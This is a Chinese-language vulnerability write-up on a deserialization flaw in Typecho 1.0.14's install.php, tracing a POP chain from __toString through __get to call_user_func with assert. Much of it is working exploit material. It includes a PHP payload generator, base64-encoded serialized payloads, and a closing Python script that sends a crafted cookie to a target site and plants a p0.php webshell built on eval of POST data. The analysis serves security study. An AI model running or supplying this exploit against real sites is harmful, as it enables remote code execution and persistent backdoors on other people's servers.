在`install.php`中存在下面这段代码
```php
<?php else : ?>
    <?php
    $config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
    Typecho_Cookie::delete('__typecho_config');
    $db = new Typecho_Db($config['adapter'], $config['prefix']);
    $db->addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);
    Typecho_Db::set($db);
    ?>
```
很明显的存在反序列操作，我们需要做的找下有那些可以被执行的魔术方法,一般是找`__destruct`,`__wakeup`,`__toString`等这些

`__destruct` : 有两处，`__wakeup`没有，我们继续看install.php下一句new了一个Db对象,跟进去Db类的构造函数看下

在DB类的构造函数里面有如下

    $adapterName = 'Typecho_Db_Adapter_' . $adapterName;

这段话将`$adapterName`属性和字符串拼接在一块，会自动调用`__toString`魔术方法，我们只需要传入一个数组，让adapter值为一个有`__toString`方法的类即可,我们来找找有那些类有`__toString` 函数

```php
/home/T00LS/database/html/cms安装包/大型cms/typecho/1.0.14/build/var/Typecho/Config.php:
  192       * @return string
  193       */
  194:     public function __toString()
  195      {
  196          return serialize($this->_currentConfig);

/home/T00LS/database/html/cms安装包/大型cms/typecho/1.0.14/build/var/Typecho/Db/Query.php:
  486       * @return string
  487       */
  488:     public function __toString()
  489      {
  490          switch ($this->_sqlPreBuild['action']) {

/home/T00LS/database/html/cms安装包/大型cms/typecho/1.0.14/build/var/Typecho/Feed.php:
  221       * @return string
  222       */
  223:     public function __toString()
  224      {
  225          $result = '<?xml version="1.0" encoding="' . $this->_charset . '"?>' . self::EOL;

3 matches across 3 files
```

主要有三处，　第一出Config.php的`__toString` 函数中是一个序列化方法，　第二处Query.php文件是一个构造查询语句的过程, 第三处在Feed.php中构造Feed输出的内容，　仔细观察发现这三个魔术方法中都没有调用一些危险函数, 这个时候我们需要继续构造pop链，直到找到一些危险函数

第三处的`__toString`函数里简要逻辑如下:
```php
    public function __toString()
    {

        if (self::RSS1 == $this->_type) {

            foreach ($this->_items as $item) {

            }

        } else if (self::RSS2 == $this->_type) {
          
            foreach ($this->_items as $item) {
                $content .= '<item>' . self::EOL;
                $content .= '<title>' . htmlspecialchars($item['title']) . '</title>' . self::EOL;
                $content .= '<link>' . $item['link'] . '</link>' . self::EOL;
                $content .= '<guid>' . $item['link'] . '</guid>' . self::EOL;
                $content .= '<pubDate>' . $this->dateFormat($item['date']) . '</pubDate>' . self::EOL;
                $content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;

            }

        } else if (self::ATOM1 == $this->_type) {
   
            foreach ($this->_items as $item) {
            ...
                    <name>' . $item['author']->screenName . '</name>
                    <uri>' . $item['author']->url . '</uri>
                </author>' . self::EOL;

                }
        return $result;
    }
}
```

这里有三个选择语句，我们看到，第二个和第三个选择语句都调用了一个item元素里的一个属性，如果这个属性是从某个类的不可访问属性里获取的，那么会自动调用`__get`方法，　因此我们这里又找到一条可以自动执行的pop链了

我们全局搜索`__get`函数，一共有七处，其他几处可以自己去看看，这里直接来到`Typecho_request.php文件处

```php
    public function __get($key)
    {
        return $this->get($key);
    }
```

跟进get()函数
```
    public function get($key, $default = NULL)
    {
        switch (true) {
            case isset($this->_params[$key]):
                $value = $this->_params[$key];
                break;
            case isset(self::$_httpParams[$key]):
                $value = self::$_httpParams[$key];
                break;
            default:
                $value = $default;
                break;
        }

        $value = !is_array($value) && strlen($value) > 0 ? $value : $default;
        return $this->_applyFilter($value);
    }
```

get方法主要通过key值获取`$this->_params`中键的值, 接着调用了`_applyFilter`方法

```php
private function _applyFilter($value)
{
    if ($this->_filter) {
        foreach ($this->_filter as $filter) {
            $value = is_array($value) ? array_map($filter, $value) :
            call_user_func($filter, $value);
        }

        $this->_filter = array();
    }

    return $value;
}
```
到这一步，我们可以看到`array_map`和`call_user_func`均可造成任意代码执行, 且`_filter`和`$value`变量都可控，　回顾整个pop链 , 我们开始构造我们的poc

```php
<?php 

class Typecho_Feed{
	private $_type='ATOM 1.0';
	private $_items;

	public function __construct(){
		$this->_items = array(
			'0'=>array(
				'author'=> new Typecho_Request())
		);
	}
}


class Typecho_Request{
	private $_params = array('screenName'=>"file_put_contents('lj.php', 'screenName')");
	private $_filter = array('assert');
}


$poc = array(
'adapter'=>new Typecho_Feed(),
'prefix'=>'typecho');

echo base64_encode(serialize($poc));
```

    YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NDE6ImZpbGVfcHV0X2NvbnRlbnRzKCdsai5waHAnLCAnc2NyZWVuTmFtZScpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9

当然你会注意到`__toString`函数也调用了url属性

```
<name>' . $item['author']->screenName . '</name>
<uri>' . $item['author']->url . '</uri>
</author>' . self::EOL;

```

那么url参数可以利用吗，也是可以的，道理一样,将Typecho_Request类改成如下即可
```
class Typecho_Request{
	public $screenName="";
	private $_params = array('url'=>"file_put_contents('lj.php', 'url')");
	private $_filter = array('assert');
}
```

这个pop链的构造其实还是有缺陷的，就是无法回显执行结果，因为install.php还调用了一个`ob_start()`函数，将结果都送入到缓冲区中了,想要回显出先执行结果，可以参考`知道创宇LoRexxar` 大佬的分析文章

https://paper.seebug.org/424/

总结:

1. 反序列化对象无法实例化去调用类函数，因此只能通过一些自动调用的魔术方法来实现
2. 构造pop链的过程即是不断寻找可以自动调用函数的地方(如将可控变量和字符拼接可以调用`__toString`函数，将可控变量访问私有属性可以调用`__get`方法，　以及一些自动调用的析构函数，直到找到可以调用危险函数的地方
3. 反序列化的漏洞可以让我们通过控制对象的变量来改变程序的执行流程，我们需要不断找一些可被自动调用的魔术方法来构造我们的pop链，从而达到我们的目的
4. 什么是pop链，参考:http://www.blogsir.com.cn/safe/452.html


exp:
```php
import requests

def poc(url):
	url = url if url.startswith('http://') else 'http://'+url
	print url
	target = url+'/install.php?finish'
	headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
		'Referer':'http://localhost:85/install.php',
		'cookie':"__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="
		}
	try:
		html = requests.get(url=target,headers=headers,timeout=3)
		if html.status_code == 404:
			return 'the file install.php is not exists'
		print 'shell:', url+'p0.php'
	except Exception  ,e:
		print e
		return False


if __name__ == '__main__':
	url = 'http://localhost:85/'
	poc(url)
```


参考文章: https://paper.seebug.org/424/
http://p0sec.net/index.php/archives/114/